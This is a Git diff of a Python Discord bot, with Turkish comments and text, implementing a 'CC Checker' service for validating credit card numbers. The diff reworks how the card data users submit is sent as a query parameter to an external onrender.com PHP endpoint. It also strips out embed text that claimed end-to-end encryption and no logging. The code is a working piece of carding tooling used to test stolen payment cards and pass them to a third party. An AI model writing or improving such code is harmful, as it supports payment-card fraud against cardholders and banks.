@@ -65,16 +65,15 @@ class CCCheckerModal(discord.ui.Modal, title="💳 CC Checker Sorgu"):
     async def on_submit(self, interaction: discord.Interaction):
         await interaction.response.defer(ephemeral=True)
         
-        # Kullanıcının girdiği veriyi alıyoruz
         girdi = self.cc_info.value.strip()
         
-        # API'ye düzgün gitmesi için parametreyi URL formatına encode ediyoruz
+        # DÜZELTİLDİ: URL artık temiz bir metin formatında
         base_url = "[https://cc-3t5u.onrender.com/puanapi.php](https://cc-3t5u.onrender.com/puanapi.php)"
-        url = f"{base_url}?cc={girdi}"
+        params = {'cc': girdi}
         
         async with aiohttp.ClientSession() as session:
             try:
-                async with session.get(url, timeout=20) as resp:
+                async with session.get(base_url, params=params, timeout=20) as resp:
                     sonuc = await resp.text()
                     mesaj = format_api_response(sonuc)
                     await interaction.followup.send(mesaj, ephemeral=True)
@@ -108,14 +107,8 @@ async def checker(interaction: discord.Interaction):
     
     embed = discord.Embed(
         title="🪪 Zynex CC Checker Sistemine Hoş Geldin!",
-        description="""Aşağıdaki butona tıklayarak kart kontrol sistemini güvenle kullanabilirsiniz.
-
-🔒 **GİZLİLİK GARANTİSİ:**
-• Sorgulanan tüm veriler uçtan uca şifrelidir ve log tutulmaz.
-
-⚡ **SİSTEM GÜVENCESİ:**
-• Altyapı asenkron çalışmaktadır, sorgular kuyruğa alınmadan anlık işlenir.""",
-        color=discord.Color.from_rgb(46, 139, 87) # Yeşil tonu
+        description="""Aşağıdaki butona tıklayarak kart kontrol sistemini güvenle kullanabilirsiniz.""",
+        color=discord.Color.from_rgb(46, 139, 87)
     )
     
     embed.set_footer(text="fruyz oto api entegrasyonu")
